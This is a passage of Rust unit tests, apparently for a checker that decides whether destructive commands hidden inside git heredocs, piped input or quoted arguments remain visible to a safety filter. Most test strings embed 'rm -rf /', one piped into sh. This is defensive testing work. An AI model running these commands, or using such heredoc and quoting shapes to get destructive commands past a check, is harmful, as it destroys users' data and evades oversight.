        assert!(still_visible("git commit -m x <<'MSG'\nrm -rf /\nMSG"));
        assert!(still_visible("git filter-branch --tree-filter <<'MSG'\nrm -rf /\nMSG"));
        assert!(still_visible("git bisect run <<'MSG'\nrm -rf /\nMSG"));
        // `-F` naming a FILE is not stdin: the body is not what git reads.
        assert!(still_visible("git commit -F /tmp/msg <<'MSG'\nrm -rf /\nMSG"));
    }

    #[test]
    fn an_inert_git_piped_into_a_shell_is_not_inert() {
        // Condition 3 must hold for the new head exactly as it does for `cat`.
        assert!(still_visible("git commit -F - <<'MSG' | sh\nrm -rf /\nMSG"));
    }

    #[test]
    fn a_vouched_git_treats_its_quoted_arguments_as_data_too() {
        // Deliberate and stated: once the argv walk has vouched for the SHAPE, this
        // function's existing rule applies unchanged — a quoted span under an inert
        // segment is data. `git commit -m 'rm -rf /'` writes a commit message, exactly as
        // `echo 'rm -rf /'` writes a line. The vouching is what is narrow, not the
        // treatment afterwards.
        assert!(!still_visible("git commit -F - -m 'rm -rf /'"));
        // …and one token further out, it is visible again, because the shape is not vouched.
        assert!(still_visible("git bisect run 'rm -rf /'"));
    }
}
